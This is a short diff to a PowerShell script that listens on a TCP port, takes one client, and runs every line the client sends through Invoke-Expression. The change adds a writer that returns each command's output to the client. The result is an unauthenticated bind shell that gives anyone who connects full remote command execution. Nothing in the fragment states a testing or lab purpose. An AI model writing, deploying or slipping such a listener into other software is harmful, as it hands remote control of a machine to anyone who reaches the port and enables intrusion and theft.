@@ -4,21 +4,29 @@ $Listner.Start()
 $Client = $Listner.AcceptTcpClient()
 $Stream = $Client.GetStream()
 $StreamReader = [System.IO.StreamReader]::new($Stream)
+$StreamWriter = [System.IO.StreamWriter]::new($Stream)
+
+function Dispose-All {
+    $Listner.Stop()
+    $Listner.Server.Dispose()
+    $StreamReader.Dispose()
+    $StreamWriter.Dispose()
+}
 
 while( $true ) {
     if( -not $Client.Connected ){
-        $Listner.Stop()
-        $Listner.Server.Dispose()
+        Dispose-All
         break
     }
     if( $Stream.DataAvailable ){
-       Invoke-Expression $StreamReader.ReadLine()
+       $StreamWriter.Write( 
+            ( Invoke-Expression $StreamReader.ReadLine() )
+        )
     }
     Start-Sleep -Seconds 1
 }
 
 
 trap{
-    $Listner.Stop()
-    $Listner.Server.Dispose()
+    Dispose-All
 }
